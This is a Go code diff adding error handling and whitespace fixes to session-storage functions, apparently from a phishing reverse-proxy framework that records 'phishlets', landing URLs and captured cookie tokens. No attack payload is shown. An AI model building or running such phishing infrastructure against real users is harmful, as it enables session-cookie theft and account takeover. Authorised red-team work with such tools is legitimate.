@@ -48,7 +48,10 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		return nil, fmt.Errorf("session already exists: %s", sid)
 	}
 
-	id, _ := d.getNextId(SessionTable)
+	id, err := d.getNextId(SessionTable)
+	if err != nil {
+		return nil, fmt.Errorf("sessions: getNextId: %w", err)
+	}
 
 	s := &Session{
 		Id:           id,
@@ -68,7 +71,10 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		Reported:     false,
 	}
 
-	jf, _ := json.Marshal(s)
+	jf, err := json.Marshal(s)
+	if err != nil {
+		return nil, fmt.Errorf("sessions: marshal: %w", err)
+	}
 
 	err = d.db.Update(func(tx *buntdb.Tx) error {
 		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
@@ -171,9 +177,12 @@ func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[
 }
 
 func (d *Database) sessionsUpdate(id int, s *Session) error {
-	jf, _ := json.Marshal(s)
+	jf, err := json.Marshal(s)
+	if err != nil {
+		return fmt.Errorf("sessions: marshal: %w", err)
+	}
 
-	err := d.db.Update(func(tx *buntdb.Tx) error {
+	err = d.db.Update(func(tx *buntdb.Tx) error {
 		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
 		return nil
 	})
@@ -215,7 +224,9 @@ func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
 	err := d.db.View(func(tx *buntdb.Tx) error {
 		found := false
 		err := tx.AscendEqual("sessions_sid", d.getPivot(map[string]string{"session_id": sid}), func(key, val string) bool {
-			json.Unmarshal([]byte(val), s)
+			if err := json.Unmarshal([]byte(val), s); err != nil {
+				return false
+			}
 			found = true
 			return false
 		})
@@ -232,7 +243,7 @@ func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
 
 func (d *Database) GetUnreportedSessions() ([]*Session, error) {
 	var sessions []*Session
-	
+
 	err := d.db.View(func(tx *buntdb.Tx) error {
 		return tx.Ascend("sessions_id", func(key, val string) bool {
 			s := &Session{}
@@ -244,17 +255,17 @@ func (d *Database) GetUnreportedSessions() ([]*Session, error) {
 			return true
 		})
 	})
-	
+
 	if err != nil {
 		return nil, err
 	}
-	
+
 	return sessions, nil
 }
 
 func (d *Database) GetActiveSessions() ([]*Session, error) {
 	var sessions []*Session
-	
+
 	err := d.db.View(func(tx *buntdb.Tx) error {
 		return tx.Ascend("sessions_id", func(key, val string) bool {
 			s := &Session{}
@@ -267,11 +278,11 @@ func (d *Database) GetActiveSessions() ([]*Session, error) {
 			return true
 		})
 	})
-	
+
 	if err != nil {
 		return nil, err
 	}
-	
+
 	return sessions, nil
 }
 
